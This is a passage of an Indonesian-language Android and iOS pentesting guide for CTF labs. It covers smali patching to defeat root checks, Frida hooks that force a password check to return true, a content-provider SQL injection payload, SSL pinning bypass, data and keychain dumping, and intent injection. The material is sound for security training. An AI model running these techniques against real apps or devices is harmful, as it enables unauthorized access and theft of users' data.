 │ (Run on Dev)  │        │ apksigner     │
 └───────────────┘        └───────────────┘
```

### Prosedur Step-by-Step Patching Smali:

Bash

```
# LANGKAH 1: Decompile APK ke Smali
apktool d "$APK_FILE" -o patched_workspace -f
cd patched_workspace

# LANGKAH 2: Cari class yang bertanggung jawab atas pengecekan root
grep -rnw "isDeviceRooted\|checkRoot" smali/
# Misal file target: smali/com/target/app/SecurityCheck.smali
```

Buka file smali tersebut menggunakan text editor.  
_Kode Smali Asli (Sebelum Patch):_

smali

```
.method public static isRooted()Z
    .registers 2

    # Menjalankan pengecekan root
    invoke-static {}, Lcom/target/app/RootUtils;->checkBuildTags()Z
    move-result v0

    # Jika bernilai 0 (false), lompat ke :cond_exit
    if-eqz v0, :cond_exit

    const/4 v1, 0x1
    return v1

    :cond_exit
    const/4 v1, 0x0
    return v1
.end method
```

_Kode Smali Hasil Patching (Memaksa Selalu Return False / 0x0):_

smali

```
.method public static isRooted()Z
    .registers 2

    # PATCH: Force return integer 0 (boolean false) secara langsung
    const/4 v0, 0x0
    return v0
.end method
```

Bash

```
# LANGKAH 3: Recompile kembali folder workspace menjadi file APK
cd ..
apktool b patched_workspace -o patched_unsigned.apk

# LANGKAH 4: Generate Debug Keystore (Hanya dibuat sekali)
if [ ! -f debug.keystore ]; then
    keytool -genkey -v -keystore debug.keystore -alias androiddebugkey \
        -keyalg RSA -keysize 2048 -validity 10000 \
        -storepass android -keypass android -dname "CN=Android Debug,O=Android,C=US"
fi

# LANGKAH 5: Alignment Optimasi File APK 4-byte boundaries (Zipalign Wajib Dulu Sebelum apksigner!)
zipalign -v -f 4 patched_unsigned.apk patched_aligned.apk

# LANGKAH 6: Sign APK Menggunakan apksigner Modern (Mendukung Signature Scheme v1, v2, v3 - API 30+)
# Install apksigner jika belum ada: sudo apt install -y apksigner
apksigner sign \
  --ks debug.keystore \
  --ks-pass pass:android \
  --key-pass pass:android \
  --out patched_final.apk \
  patched_aligned.apk

# Verifikasi Signature Scheme v1/v2/v3
apksigner verify --verbose patched_final.apk

# (Opsi Legacy Mode jika apksigner tidak tersedia):
# jarsigner -verbose -sigalg SHA256withRSA -digestalg SHA-256 -keystore debug.keystore -storepass android patched_unsigned.apk androiddebugkey
# zipalign -v -f 4 patched_unsigned.apk patched_final.apk

# LANGKAH 7: Hapus aplikasi lama dan pasang versi yang sudah di-patch
adb uninstall "$PKG"
adb install patched_final.apk
```

---

## 💉 Bagian 7: Frida Scripting untuk CTF

Frida memungkinkan injeksi kode JavaScript dinamis ke dalam ruang memori runtime process ART/Dalvik tanpa memodifikasi file APK di disk.

### 7.1 Hooking Dasar: Membaca Argumen & Memaksa Nilai Return

Simpan script berikut sebagai `hook_login.js`:

JavaScript

```
// Hook fungsi validasi password untuk melihat parameter input dan membypass logic
Java.perform(function () {
    console.log("[*] Frida script aktif. Mencari class target...");

    // Tentukan class target
    var AuthValidator = Java.use("com.insecure.bank.util.AuthValidator");

    // 1. Hook method: memodifikasi perilaku verifikasi password
    AuthValidator.verifyPassword.implementation = function (inputPassword) {
        console.log("\n[!] verifyPassword() TERPANGGIL!");
        console.log("[+] Password yang dimasukkan user: " + inputPassword);

        // Jalankan fungsi aslinya untuk mengetahui return sebenarnya
        var originalResult = this.verifyPassword(inputPassword);
        console.log("[+] Nilai return asli: " + originalResult);

        // BUKTI LOGIC BYPASS: Paksa fungsi selalu mengembalikan nilai true
        console.log("[*] Memaksa return value menjadi: TRUE");
        return true;
    };

    // 2. Hook fungsi enkripsi/dekripsi string (Hunting Decrypted Flag)
    var CryptoUtils = Java.use("com.insecure.bank.util.CryptoUtils");
    CryptoUtils.decryptAES.implementation = function (cipherBytes, keyBytes) {
        console.log("\n[!] decryptAES() TERPANGGIL!");
        var decryptedText = this.decryptAES(cipherBytes, keyBytes);
        console.log("[FLAG LOOT] Plaintext Decrypted: " + decryptedText);
        return decryptedText;
    };
});
```

Jalankan:

Bash

```
frida -U -f "$PKG" -l hook_login.js --no-pause
```

---

### 7.2 Pola Scripting Khusus CTF

#### Pattern A: Dump Seluruh SharedPreferences Langsung dari Memori

Simpan sebagai `dump_prefs.js`:

JavaScript

```
Java.perform(function () {
    var ActivityThread = Java.use('android.app.ActivityThread');
    var Context = ActivityThread.currentApplication().getApplicationContext();
    var File = Java.use('java.io.File');

    var sharedPrefsDir = File.$new(Context.getApplicationInfo().dataDir.value + "/shared_prefs");
    var files = sharedPrefsDir.list();

    if (files) {
        for (var i = 0; i < files.length; i++) {
            var fileName = files[i].replace(".xml", "");
            var sp = Context.getSharedPreferences(fileName, 0);
            console.log("\n[+] SHARED PREFS: " + fileName);
            console.log(JSON.stringify(sp.getAll()));
        }
    }
});
```

#### Pattern B: Logging Seluruh HTTP URL yang Dipanggil via `java.net.URL`

JavaScript

```
Java.perform(function () {
    var URL = Java.use("java.net.URL");
    URL.$init.overload('java.lang.String').implementation = function (urlStr) {
        console.log("[HTTP URL DISCOVERY] -> " + urlStr);
        return this.$init(urlStr);
    };
});
```

---

## 🤖 Bagian 8: Automated Analysis dengan MobSF

MobSF (_Mobile Security Framework_) menyediakan analisis statis dan dinamis otomatis berbasis web.

Bash

```
# 1. Jalankan container MobSF
sudo docker run -d --name mobsf -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest

# 2. Akses antarmuka web di browser Parrot OS:
# http://localhost:8000/

# 3. Otomasi Pengujian Menggunakan MobSF REST API:
MOBSF_URL="http://localhost:8000"
# Ambil API key otomatis dari log container
API_KEY=$(sudo docker logs mobsf 2>&1 | grep "REST API Key:" | awk '{print $NF}' | tr -d '\r')

# Upload APK ke MobSF
UPLOAD_RESP=$(curl -s -F "file=@$APK_FILE" -H "Authorization:$API_KEY" "$MOBSF_URL/api/v1/upload")
HASH=$(echo "$UPLOAD_RESP" | jq -r '.hash')

# Trigger proses pemindaian statis
curl -s -X POST -H "Authorization:$API_KEY" --data "hash=$HASH" "$MOBSF_URL/api/v1/scan" > /dev/null

# Unduh laporan ringkasan dalam format JSON
curl -s -H "Authorization:$API_KEY" "$MOBSF_URL/api/v1/report_json?hash=$HASH" > ./output/mobsf_report.json

# Parse skor keamanan dan high-severity vulnerabilities
cat ./output/mobsf_report.json | jq '{security_score: .security_score, high_issues: .manifest_analysis.manifest_findings[] | select(.severity=="high")}'
```

---

## 🚩 Bagian 9: 8 Common CTF Android Patterns

### Pattern 1: Flag Disimpan di `SharedPreferences`

- **Indikasi / Trigger:** Aplikasi menyimpan status token user offline atau status pendaftaran game.
- **Command Eksekusi:**
    
    Bash
    
    ```
    adb shell "cat /data/data/$PKG/shared_prefs/*.xml"
    ```
    
- **Output Nyata:**
    
    XML
    
    ```
    <map>
        <string name="flag">flag{sh4r3d_pr3fs_4r3_jusr_pl41n_xml}</string>
    </map>
    ```
    
- **Red Flag Berhasil:** String flag berformat ASCII langsung terbaca di dalam tag `<string>`.

---

### Pattern 2: Hardcoded Flag di Source Code (Java / Native Assets)

- **Indikasi / Trigger:** Tidak ada komunikasi jaringan saat aplikasi dibuka, flag diverifikasi secara lokal.
- **Command Eksekusi:**
    
    Bash
    
    ```
    jadx -d ./jadx_src "$APK_FILE"
    grep -rnwi "./jadx_src" -e "flag{" -e "picoCTF{" -e "CTF{"
    ```
    
- **Output Nyata:**
    
    Java
    
    ```
    if (userInput.equals("picoCTF{h4rdc0d3d_str1ng_1s_n0t_s3cur3}")) {
        Toast.makeText(this, "Success!", 0).show();
    }
    ```
    
- **Red Flag Berhasil:** Hardcoded string ditemukan pada perbandingan `.equals()`.

---

### Pattern 3: Login Bypass Menggunakan Exported Activity

- **Indikasi / Trigger:** `AndroidManifest.xml` memuat activity seperti `com.target.FlagActivity` dengan atribut `android:exported="true"`.
- **Command Eksekusi:**
    
    Bash
    
    ```
    adb shell am start -n "$PKG/.FlagActivity"
    ```
    
- **Output Nyata:** Layar emulator langsung berpindah melewati halaman login dan merender activity target yang menampilkan flag di UI TextView.
- **Red Flag Berhasil:** Layar memuat teks flag tanpa meminta kredensial akun.

---

### Pattern 4: SQL Injection di Content Provider

- **Indikasi / Trigger:** Terdapat content provider yang diekspor dan menggunakan raw SQLite query `rawQuery()` di source code.
- **Command Eksekusi:**
    
    Bash
    
    ```
    adb shell content query --uri "content://com.target.provider/notes" --where "1=1 UNION SELECT 1,flag,3 FROM secret--"
    ```
    
- **Output Nyata:**
    
    text
    
    ```
    Row: 0 _id=1, title=flag{c0nt3nt_pr0v1d3r_sqli_pwn3d}, content=3
    ```
    
- **Red Flag Berhasil:** Data dari tabel `secret` yang seharusnya tersembunyi berhasil di-dump ke terminal.

---

### Pattern 5: Flag di Encrypted Storage (Intercept via Frida Hook)

- **Indikasi / Trigger:** Data lokal dienkripsi menggunakan AES/DES, namun kunci enkripsi di-derive saat runtime.
- **Command Eksekusi:** Pasang hook pada method `javax.crypto.Cipher.doFinal([B)`.
    
    Bash
    
    ```
    frida -U -f "$PKG" -l hook_cipher.js --no-pause
    ```
    
- **Output Nyata:**
    
    text
    
    ```
    [Cipher Hook] Operation: DECRYPT
    [Cipher Hook] Result Data: HTB{fr1d4_h00k_c1ph3r_succ3ss}
    ```
    
- **Red Flag Berhasil:** Buffer decrypted bytes terbaca di stdout Frida sebelum diteruskan ke UI aplikasi.

---

### Pattern 6: SSL Pinning Bypass untuk Menangkap Flag API

- **Indikasi / Trigger:** Aplikasi mengirimkan request otentikasi ke backend server via HTTPS, namun Burp Suite mencatat error `SSL handshake failed`.
- **Command Eksekusi:**
    
    Bash
    
    ```
    objection -g "$PKG" explore --startup-command "android sslpinning disable"
    ```
    
- **Output Nyata:** Burp Suite HTTP History menampilkan transaksi request `GET /api/v1/get_flag` yang merespons:
    
    JSON
    
    ```
    {"status": "ok", "flag": "flag{ssl_p1nn1ng_byp4ss3d_v14_0bj3ct10n}"}
    ```
    
- **Red Flag Berhasil:** Traffic HTTPS terlihat jelas pada panel Burp Suite.

---

### Pattern 7: APK Patching untuk Membuka Fitur Tersembunyi / Root Lock

- **Indikasi / Trigger:** Aplikasi langsung crash atau menutup diri saat dibuka di emulator dengan pesan "Device is Rooted!".
- **Command Eksekusi:**
    1. Bongkar via `apktool d`.
    2. Modifikasi baris instruksi method root check agar me-return `const/4 v0, 0x0`.
    3. Rebuild, sign, dan install kembali via `adb install`.
- **Output Nyata:** Aplikasi berjalan normal di emulator yang memiliki status root tanpa memunculkan peringatan.
- **Red Flag Berhasil:** Proteksi lokal berhasil dilewati sepenuhnya secara permanen.

---

### Pattern 8: Flag Disimpan di Native Library (`.so` via JNI)

- **Indikasi / Trigger:** Source Java memuat method dengan keyword `native` (contoh: `public native String getFlag();`) dan memanggil `System.loadLibrary("native-lib");`.
- **Command Eksekusi:**
    
    Bash
    
    ```
    # Ekstraksi string langsung dari shared object library arsitektur x86/arm
    strings static/smali_decoded/lib/x86_64/libnative-lib.so | grep -iE "flag\{|picoCTF\{|key"
    ```
    
- **Output Nyata:**
    
    text
    
    ```
    picoCTF{n4t1v3_l1br4ry_str1ngs_r3v34l3d}
    ```
    
- **Red Flag Berhasil:** Flag atau kunci dekripsi ditemukan di dalam segmen data file biner ELF shared object.

---

## 🗺️ Bagian 10: Decision Tree Android Pentest

Gunakan peta alur keputusan berikut setiap kali menerima file APK target:

text

```text
                            [ TARGET APK DITERIMA ]
                                       │
                      ┌────────────────┴────────────────┐
                      ▼                                 ▼
             [ STATIC ANALYSIS ]               [ DYNAMIC ANALYSIS ]
         (Decompile via JADX & apktool)     (Jalankan di Rooted Emulator)
                      │                                 │
         ┌────────────┴────────────┐                    ├► Setup Burp Suite Proxy
         ▼                         ▼                    │  (Install User/System Cert)
  [ AndroidManifest.xml ]    [ Hunting Secrets ]        │
         │                         │                    ▼
         ├► exported="true"?       ├► strings.xml     [ TRAFFIC TANGKAP DI BURP? ]
         │   └── am start/query    ├► hardcoded API   ┌─┴────────────────────────┐
         ├► allowBackup="true"?    ├► assets/ files   ▼ YES                      ▼ NO (SSL Pinning)
         │   └── adb backup        └► Native lib .so  Analisis REST API          objection / Frida
         └► debuggable="true"?                        Endpoints                  sslpinning disable
             └── attach jdb                                              │
                                                                         ▼
                                                       [ RUNTIME RESTRICTIONS? ]
                                                                         │
                                                       ├── Root / Emulator Check?
                                                       │    └── Patch Smali / Frida Hook
                                                       └── Encrypted Database / Prefs?
                                                            └── Inspect /data/data/$PKG/
```

### 🎯 Linear Sub-Decision Flow (Panduan Pemula)

```text
[Step 1] Decompile APK via JADX & apktool
   │
   ├─► Cek AndroidManifest.xml: Ada komponen exported="true"?
   │      ├─► YES: Tes pemicuan via ADB (am start / content query / am broadcast)
   │      └─► NO : Lanjut ke Step 2
   │
[Step 2] Scanning Hardcoded Secrets
   │
   ├─► Ada API Key / Flag / Cloud Secret di JADX Java / strings.xml / Assets?
   │      ├─► YES: Dapatkan loot / eksekusi eksploitasi API
   │      └─► NO : Lanjut ke Step 3
   │
[Step 3] Dynamic Testing di Emulator
   │
   ├─► Aplikasi memunculkan error "Device is Rooted / Emulator Detected"?
   │      ├─► YES: Inject Frida Script bypass / Patch smali method return false
   │      └─► NO : Lanjut ke Step 4
   │
[Step 4] Intersepsi Network Traffic
   │
   ├─► Traffic HTTPS muncul di Burp Suite?
   │      ├─► YES: Analisis endpoint API & tes kerentanan Web/API
   │      └─► NO : Jalankan objection "android sslpinning disable" atau script Frida custom
```

---

## 🛠️ Bagian 11: Common Errors & Troubleshooting

|Pesan Error / Gejala|Akar Penyebab Masalah|Tindakan Solusi Pentester|
|---|---|---|
|`INSTALL_FAILED_VERIFICATION_FAILURE`|Mekanisme Google Play Protect di emulator memblokir pemasangan APK hasil modifikasi.|Nonaktifkan Play Protect via ADB: `adb shell settings put global package_verifier_enable 0`.|
|`INSTALL_PARSE_FAILED_MANIFEST_MALFORMED`|Kesalahan sintaks XML setelah proses editing manual pada file `AndroidManifest.xml`.|Validasi penutupan tag XML pada `AndroidManifest.xml` sebelum melakukan rebuild `apktool b`.|
|`Frida: "unable to find process with name ..."`|Aplikasi belum running saat mode attach dijalankan, atau nama package salah ketik.|Gunakan mode spawn (`-f <package_name>`) bukan mode attach, atau cek nama via `frida-ps -Ua`.|
|`adb: device unauthorized`|Kunci otorisasi RSA komputer belum disetujui di layar perangkat Android.|Buka kunci layar device, cabut kabel USB, sambungkan kembali, dan centang **Always allow from this computer**.|
|`apktool: "brut.androlib.AndrolibException"`|Cache resource Android framework benturan dengan versi framework sistem yang terpasang.|Bersihkan cache framework apktool: `apktool empty-framework-dir --force`.|
|`JADX: "error: inconsistent code"`|Decompiler JADX gagal memetakan alur kontrol bytecode yang terobfuskasi.|Buka menu Options di JADX →→ Aktifkan fitur _Show Inconsistent Code_ atau baca file Smali aslinya.|
|`objection: "Agent terminated with error"`|Versi client `frida-tools` di Parrot OS tidak identik dengan versi binary `frida-server` di Android.|Pastikan versi Frida client dan server identik: `frida --version` harus sama dengan output `./frida-server --version`.|
|SSL Pinning bypass gagal setelah inject script|Aplikasi menggunakan library non-standar (misal: Flutter, React Native, Network Security Pin-Set murni).|Gunakan script pinning khusus Flutter (`disable-flutter-tls`) atau patch biner `libflutter.so`.|
|`Failure [INSTALL_FAILED_UPDATE_INCOMPATIBLE]`|Versi APK yang ingin dipasang memiliki signature sertifikat berbeda dengan versi yang sudah terinstall.|Hapus versi aplikasi lama terlebih dahulu: `adb uninstall <package_name>` lalu install ulang.|
|`sqlite3: "database is locked"`|Aplikasi sedang mengunci file database untuk operasi penulisan aktif.|Salin file database ke direktori `/data/local/tmp` terlebih dahulu sebelum di-pull ke PC.|
|`run-as: package not debuggable`|Perintah `run-as` gagal karena atribut `android:debuggable="true"` tidak ada di manifest.|Gunakan emulator yang memiliki akses root penuh (`su`) alih-alih mengandalkan utilitas `run-as`.|
|`zipalign: command not found`|Paket tool Android build SDK belum lengkap di sistem Parrot OS.|Pasang utilitas zipalign: `sudo apt install -y zipalign`.|

---

## 📋 Bagian 12: Cheatsheet Copy-Paste Ready

### 1. Static Analysis Quick Start

Bash

```
# Decompile lengkap ke source Java via JADX
jadx -d ./output_java "$APK_FILE"

# Decompile ke Smali bytecode untuk kebutuhan patching
apktool d "$APK_FILE" -o ./output_smali -f

# Ekstraksi package name dan launchable activity
aapt dump badging "$APK_FILE" | grep -E "package:|launchable-activity:"

# Scanning hardcoded keys & string flags di source code
grep -rnwi "./output_java" -e "flag{" -e "api_key" -e "secret" -e "password"
```

### 2. Dynamic Analysis & Data Extraction

Bash

```
# Monitor logcat real-time terfilter pada kata kunci penting
adb logcat -c && adb logcat | grep -iE "flag|secret|token|password"

# Ekstraksi dan dump isi SharedPreferences aplikasi (Root)
adb shell "cat /data/data/$PKG/shared_prefs/*.xml"

# Pull seluruh database SQLite aplikasi ke workstation lokal
adb pull "/data/data/$PKG/databases/" ./loot_db/

# Membaca isi tabel SQLite langsung dari terminal
sqlite3 ./loot_db/*.db "SELECT * FROM users;"
```

### 3. ADB Essentials

Bash

```
# Menampilkan daftar device dan status otorisasi
adb devices -l

# Menginstal file APK ke perangkat target
adb install -r -t "$APK_FILE"

# Mencopot pemasangan (uninstall) aplikasi
adb uninstall "$PKG"

# Membuka root shell langsung di perangkat Android
adb root && adb shell
```

### 4. Frida & Objection Execution

Bash

```
# Eksekusi Frida script dengan teknik spawn (Aplikasi dibuka dari awal)
frida -U -f "$PKG" -l custom_hook.js --no-pause

# Menjalankan Objection explore environment
objection -g "$PKG" explore

# Perintah one-liner Objection untuk bypass SSL Pinning otomatis
objection -g "$PKG" explore --startup-command "android sslpinning disable"

# Memeriksa status proses aplikasi yang sedang berjalan via Frida
frida-ps -Ua
```

### 5. Exported Component Interaction

Bash

```
# Pemicuan Activity secara langsung via ADB
adb shell am start -n "$PKG/.TargetActivity"

# Mengirim parameter Boolean dan String ke Activity
adb shell am start -n "$PKG/.TargetActivity" --ez "isAdmin" true --es "user" "admin"

# Melakukan query data ke Content Provider yang diekspor
adb shell content query --uri "content://$PKG.provider/data"

# Mengirim Broadcast Intent ke Receiver spesifik
adb shell am broadcast -a "com.target.ACTION_NAME" -n "$PKG/.MyReceiver"
```

### 6. APK Patching & Repackaging Pipeline

Bash

```
# 1. Rebuild folder Smali menjadi file APK biner
apktool b ./patched_folder -o unaligned.apk

# 2. Berikan tanda tangan digital menggunakan keystore
jarsigner -keystore debug.keystore -storepass android unaligned.apk androiddebugkey

# 3. Lakukan 4-byte alignment
zipalign -v -f 4 unaligned.apk final_patched.apk

# 4. Pasang hasil patching ke perangkat
adb install -r final_patched.apk
```

---

## 🍏 Bagian 13: iOS Quick Reference (IPA Analysis)

Ringkasan cepat metode pentest aplikasi iOS (IPA) untuk komparasi dengan Android:

### 1. Ekstraksi & Dekompilasi Paket IPA
- File `.ipa` adalah arsip ZIP standar.
- Ekstrak isi IPA: `unzip app_target.ipa -d ./ipa_extracted/`
- Cari biner aplikasi utama: `./ipa_extracted/Payload/TargetApp.app/TargetApp`
- Inspect metadata & entitlements: `codesign -d --entitlements :- ./ipa_extracted/Payload/TargetApp.app/TargetApp`

### 2. Static Analysis & Class Dump
- Gunakan `class-dump` atau `dsdump` untuk merekonstruksi header Objective-C / Swift interface:
  ```bash
  dsdump --arch arm64 ./Payload/TargetApp.app/TargetApp > iOS_headers.h
  ```
- Cari hardcoded string / API Keys:
  ```bash
  strings ./Payload/TargetApp.app/TargetApp | grep -iE "api_key|secret|flag{"
  ```

### 3. iOS Dynamic Instrumentation & SSL Pinning Bypass (Frida / Objection)
- Syarat: Perangkat iPhone harus sudah **Jailbroken** dan menjalankan `frida-server` via Cydia/Sileo.
- Hubungkan USB ke iPhone dan jalankan Objection:
  ```bash
  objection -g "com.target.iosapp" explore
  # Bypass SSL Pinning iOS:
  # ios sslpinning disable
  ```
- Dump Keychain (Penyimpanan Password/Token iOS):
  ```bash
  # Di dalam konsol Objection:
  # ios keychain dump
  ```

---

# [⚡ Quick Start Checklist (Untuk Pemula)](/docs/android-apk) — Interactive Decision Workflow

> **Cara baca dokumen ini:** Setiap langkah punya **OUTPUT BERHASIL** ✅ dan **OUTPUT GAGAL/BERBEDA** ❌. Ikuti panah sesuai output yang kamu dapat. Jangan skip langkah.

---

## 🔧 PRE-FLIGHT: Setup Environment

Bash

```
# Jalankan INI DULU sebelum apapun. Satu kali di awal sesi.
export APK_FILE="target_app.apk"
export APP_NAME=$(basename "$APK_FILE" .apk)
export LHOST="10.10.14.5"        # IP tun0 kamu (VPN HTB/THM)
export LPORT="4444"

# Buat struktur workspace
mkdir -p ~/mobile_pentest/"$APP_NAME"/{static,dynamic,frida,output,loot/{creds,keys,db}}
cd ~/mobile_pentest/"$APP_NAME"
cp /path/to/"$APK_FILE" .

echo "[*] Target APK: $APK_FILE"
echo "[*] Workspace: ~/mobile_pentest/$APP_NAME"
```

**Output yang diharapkan:**

text

```
[*] Target APK: target_app.apk
[*] Workspace: ~/mobile_pentest/target_app
```

---

## ═══════════════════════════════════════

## FASE 0: IDENTIFIKASI & KONFIRMASI APK

## ═══════════════════════════════════════

> **Tujuan:** Konfirmasi format file valid, ekstrak metadata dasar, dan siapkan emulator. Ini fondasi sebelum analisis apapun.

### Langkah 0.1 — Konfirmasi Format File

Bash

```
# Command 1: Konfirmasi format biner
file "$APK_FILE"

# Command 2: Cek isi internal (APK = ZIP)
unzip -l "$APK_FILE" | head -20

# Command 3: Cek apakah file utuh (tidak corrupt)
unzip -t "$APK_FILE" 2>&1 | tail -3
```

**OUTPUT BERHASIL ✅ — File valid:**

text

```
target_app.apk: Zip archive data, at least v2.0 to extract
```

**OUTPUT GAGAL ❌ — File corrupt/salah format:**

text

```
target_app.apk: data
```

➡️ File bukan APK. Cek apakah ini `.xapk`, `.apks`, atau `.aab`:

Bash

```
# Jika .xapk (ZIP yang berisi beberapa APK)
unzip target_app.xapk -d xapk_extracted/
ls xapk_extracted/*.apk    # cari base.apk

# Jika .aab (Android App Bundle - perlu konversi)
# Download bundletool: https://github.com/google/bundletool
java -jar bundletool.jar build-apks --bundle=app.aab --output=app.apks --mode=universal
unzip app.apks -d apks_extracted/
# APK ada di: apks_extracted/universal.apk
export APK_FILE="apks_extracted/universal.apk"
```

---

### Langkah 0.2 — Ekstrak Metadata Dasar

Bash

```
# Command 1: Cek package name, version, launchable activity
aapt dump badging "$APK_FILE" | grep -E "package:|launchable-activity:|versionCode|versionName"

# Command 2: Alternatif jika aapt tidak ada
apktool d "$APK_FILE" -o /tmp/meta_temp -f 2>/dev/null
grep -E "package|android:versionName" /tmp/meta_temp/AndroidManifest.xml | head -5
rm -rf /tmp/meta_temp
```

**OUTPUT BERHASIL ✅:**

text

```
package: name='com.insecure.bank' versionCode='1' versionName='1.0'
launchable-activity: name='com.insecure.bank.LoginActivity' label='InsecureBank'
```

**Cara baca dan simpan info:**

Bash

```
# Simpan package name untuk dipakai di command selanjutnya
export PKG="com.insecure.bank"
export MAIN_ACTIVITY="com.insecure.bank.LoginActivity"
echo "PKG=$PKG" >> ~/mobile_pentest/"$APP_NAME"/.session_vars
echo "APK: $APK_FILE | PKG: $PKG | Activity: $MAIN_ACTIVITY"
```

**OUTPUT GAGAL ❌ — aapt not found:**

text

```
bash: aapt: command not found
```

➡️ Install tools:

Bash

```
sudo apt install -y aapt
# Atau gunakan alternatif apktool:
apktool d "$APK_FILE" -o /tmp/meta_check -f 2>/dev/null && \
  cat /tmp/meta_check/AndroidManifest.xml | grep -oP 'package="\K[^"]+' | head -1
```

---

### Langkah 0.3 — Konfirmasi Emulator Aktif

Bash

```
# Command 1: Cek device terhubung
adb devices -l
```

**OUTPUT BERHASIL ✅ — Emulator aktif:**

text

```
List of devices attached
emulator-5554   device product:sdk_gphone64_x86_64 model:sdk_gphone64_x86_64
```

**OUTPUT BERHASIL ✅ — Device terhubung tapi unauthorized:**

text

```
emulator-5554   unauthorized
```

➡️ Buka layar emulator → klik **"Allow USB Debugging"** → jalankan `adb devices` lagi.

**OUTPUT GAGAL ❌ — Tidak ada device:**

text

```
List of devices attached
```

➡️ Emulator belum berjalan. Start emulator:

Bash

```
# Opsi 1: Via Android Studio Device Manager (GUI)
# Opsi 2: Via CLI
~/Android/Sdk/emulator/emulator -avd pentest_device -no-snapshot &
sleep 15  # Tunggu boot
adb wait-for-device
adb devices

# Verifikasi root access (harus bisa untuk dynamic analysis)
adb shell id
# Harusnya: uid=0(root) gid=0(root)
```

**OUTPUT GAGAL ❌ — Emulator ada tapi BUKAN root:**

text

```
uid=2000(shell) gid=2000(shell)
```

➡️ Emulator pakai Google Play image (tidak bisa root). Perlu buat AVD baru dengan **Google APIs** image (bukan Google Play Store):

Bash

```
# Buat AVD baru dengan image yang mendukung root
~/Android/Sdk/cmdline-tools/latest/bin/avdmanager create avd \
  -n "pentest_root" \
  -k "system-images;android-28;google_apis;x86_64" \
  --device "pixel_3a"
~/Android/Sdk/emulator/emulator -avd pentest_root -no-snapshot &
```

---

## ═══════════════════════════════════════

## FASE 1: STATIC ANALYSIS — MANIFEST

## ═══════════════════════════════════════

> **Tujuan:** Baca "peta bangunan" APK. Manifest menentukan semua pintu masuk (exported components) dan izin sensitif. **Ini langkah tercepat untuk temukan attack surface.**

### Langkah 1.1 — Decompile APK (Dua Tool Sekaligus)

Bash

```
# METHOD 1: apktool → untuk baca manifest + smali + patching
apktool d "$APK_FILE" -o static/smali_decoded -f

# METHOD 2: JADX → untuk baca source Java (lebih mudah dibaca manusia)
jadx -d static/jadx_java "$APK_FILE" --show-bad-code 2>/dev/null

echo "[*] Decompile selesai. Cek hasil:"
ls static/smali_decoded/
ls static/jadx_java/
```

**OUTPUT BERHASIL ✅ — apktool:**

text

```
I: Using Apktool 2.7.0 on target_app.apk
I: Loading resource table...
I: Decoding AndroidManifest.xml with resources...
I: Decoding file-resources...
I: Decoding values */* XMLs...
I: Baksmaling classes.dex...
I: Copying assets and libs...
I: Finished.
```

**OUTPUT GAGAL ❌ — apktool framework error:**

text

```
brut.androlib.AndrolibException: Could not decode arsc file
```

➡️ Clear framework cache dan coba lagi:

Bash

```
apktool empty-framework-dir --force
apktool d "$APK_FILE" -o static/smali_decoded -f --no-res
# --no-res: skip resource decoding jika masih error
```

**OUTPUT GAGAL ❌ — JADX error inconsistent code:**

text

```
ERROR - 'LoginActivity' code inconsistent, trying to use simple decomp...
```

➡️ Normal. JADX tetap menghasilkan output. Aktifkan show-bad-code:

Bash

```
jadx -d static/jadx_java "$APK_FILE" --show-bad-code --deobf
# --deobf: aktifkan deobfuscation jika APK di-obfuscate
```

---

### Langkah 1.2 — Analisis AndroidManifest.xml (KRITIS!)

Bash

```
MANIFEST="static/smali_decoded/AndroidManifest.xml"

# Command 1: Cari SEMUA komponen yang exported (pintu masuk penyerang)
echo "=== EXPORTED COMPONENTS ==="
grep -n 'android:exported="true"' "$MANIFEST"

# Command 2: Cek flags berbahaya
echo "=== SECURITY FLAGS ==="
grep -iE 'allowBackup|debuggable|networkSecurityConfig|usesCleartextTraffic' "$MANIFEST"

# Command 3: Ekstrak semua permissions
echo "=== PERMISSIONS ==="
grep "uses-permission" "$MANIFEST" | awk -F'"' '{print $2}' | sort -u

# Command 4: Tampilkan semua activity, service, receiver, provider
echo "=== ACTIVITIES ==="
grep -oP 'android:name="\K[^"]+' "$MANIFEST" | sort -u
```

**OUTPUT BERHASIL ✅ — Ada exported components:**

text

```
=== EXPORTED COMPONENTS ===
23:  <activity android:exported="true" android:name="com.insecure.bank.AdminActivity"/>
45:  <activity android:exported="true" android:name="com.insecure.bank.FlagActivity"/>
67:  <provider android:authorities="com.insecure.bank.provider" android:exported="true" android:name="com.insecure.bank.DataProvider"/>
89:  <receiver android:exported="true" android:name="com.insecure.bank.receivers.BackdoorReceiver"/>

=== SECURITY FLAGS ===
12: android:allowBackup="true"
13: android:debuggable="true"
```

**Tabel evaluasi Red Flag Manifest:**

|Flag|Nilai|Tindakan Langsung|
|---|---|---|
|`exported="true"` pada Activity|Ada|→ Langkah 1.3: Test `am start`|
|`exported="true"` pada Provider|Ada|→ Langkah 1.4: Test `content query`|
|`exported="true"` pada Receiver|Ada|→ Langkah 1.5: Test `am broadcast`|
|`allowBackup="true"`|Ada|→ Test `adb backup` dump data|
|`debuggable="true"`|Ada|→ Bisa attach debugger, dump memory|
|`usesCleartextTraffic="true"`|Ada|→ HTTP plaintext bisa ditangkap Burp|

**Simpan daftar exported components:**

Bash

```
grep -oP 'android:name="\K[^"]+' "$MANIFEST" > ~/mobile_pentest/"$APP_NAME"/output/all_components.txt
grep -B5 'exported="true"' "$MANIFEST" | grep "android:name" | awk -F'"' '{print $2}' \
  > ~/mobile_pentest/"$APP_NAME"/output/exported_components.txt

echo "[*] Exported components:"
cat ~/mobile_pentest/"$APP_NAME"/output/exported_components.txt
```

**OUTPUT AMAN — Tidak ada exported components:**

text

```
=== EXPORTED COMPONENTS ===
(no output)
```

➡️ Tidak ada pintu masuk langsung. Lanjut ke **Fase 2 — Static Code Analysis**.

---

### Langkah 1.3 — Test Exported Activity (Jika Ada)

Bash

```
# Install APK dulu ke emulator
adb install -r "$APK_FILE"

# Test 1: Trigger langsung tanpa parameter
adb shell am start -n "$PKG/.AdminActivity"

# Test 2: Trigger dengan Boolean injection (bypass isAdmin check)
adb shell am start -n "$PKG/.AdminActivity" \
  --ez "isAdmin" true \
  --es "username" "administrator" \
  --ei "userId" 1

# Test 3: Trigger dengan Deep Link URI
# (Cek dulu intent-filter di manifest untuk scheme)
grep -A10 "intent-filter" "$MANIFEST" | grep "scheme\|host\|pathPrefix"
adb shell am start -a "android.intent.action.VIEW" \
  -d "insecurebank://transfer?amount=9999&to=attacker"
```

**OUTPUT BERHASIL ✅ — Activity terbuka di emulator:**

text

```
Starting: Intent { cmp=com.insecure.bank/.AdminActivity }
